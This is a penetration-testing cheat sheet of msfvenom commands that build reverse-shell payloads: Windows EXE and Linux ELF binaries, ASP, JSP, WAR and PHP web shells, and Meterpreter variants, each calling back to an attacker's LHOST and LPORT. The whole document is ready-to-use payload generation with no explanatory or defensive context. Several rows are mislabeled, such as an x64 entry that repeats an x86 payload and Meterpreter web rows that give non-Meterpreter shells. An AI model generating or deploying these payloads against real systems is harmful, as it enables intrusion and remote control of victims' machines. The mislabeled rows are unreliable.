# Msfvenom

### Non-Meterpreter Binaries

Staged Payloads for Windows

<table data-header-hidden><thead><tr><th width="53"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p windows/shell/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr><tr><td>x64</td><td><code>msfvenom -p windows/x64/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr></tbody></table>

Stageless Payloads for Windows

<table data-header-hidden><thead><tr><th width="53"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr><tr><td>x64</td><td><code>msfvenom -p windows/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr></tbody></table>

Staged Payloads for Linux

<table data-header-hidden><thead><tr><th width="54"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p linux/x86/shell/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr><tr><td>x64</td><td><code>msfvenom -p linux/x64/shell/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr></tbody></table>

Stageless Payloads for Linux

<table data-header-hidden><thead><tr><th width="54"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p linux/x86/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr><tr><td>x64</td><td><code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr></tbody></table>

***

### Non-Meterpreter Web Payloads

<table data-header-hidden><thead><tr><th width="54"></th><th></th></tr></thead><tbody><tr><td>asp</td><td><code>msfvenom -p windows/shell/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f asp > shell.asp</code></td></tr><tr><td>jsp</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw > shell.jsp</code></td></tr><tr><td>war</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f war > shell.war</code></td></tr><tr><td>php</td><td><code>msfvenom -p php/reverse_php LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw > shell.php</code></td></tr></tbody></table>

***

### Meterpreter Binaries

Staged Payloads for Windows

<table data-header-hidden><thead><tr><th width="55"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr><tr><td>x64</td><td><code>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr></tbody></table>

Stageless Payloads for Windows

<table data-header-hidden><thead><tr><th width="54"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p windows/meterpreter_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr><tr><td>x64</td><td><code>msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f exe > shell.exe</code></td></tr></tbody></table>

Staged Payloads for Linux

<table data-header-hidden><thead><tr><th width="53"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr><tr><td>x64</td><td><code>msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr></tbody></table>

Stageless Payloads for Linux

<table data-header-hidden><thead><tr><th width="53"></th><th></th></tr></thead><tbody><tr><td>x86</td><td><code>msfvenom -p linux/x86/meterpreter_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr><tr><td>x64</td><td><code>msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f elf > shell.elf</code></td></tr></tbody></table>

***

### Meterpreter Web Payloads

<table data-header-hidden><thead><tr><th width="56"></th><th></th></tr></thead><tbody><tr><td>asp</td><td><code>msfvenom -p windows/meterpreter/reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f asp > shell.asp</code></td></tr><tr><td>jsp</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw > shell.jsp</code></td></tr><tr><td>war</td><td><code>msfvenom -p java/jsp_shell_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f war > shell.war</code></td></tr><tr><td>php</td><td><code>msfvenom -p php/meterpreter_reverse_tcp LHOST=&#x3C;IP> LPORT=&#x3C;PORT> -f raw > shell.php</code></td></tr></tbody></table>
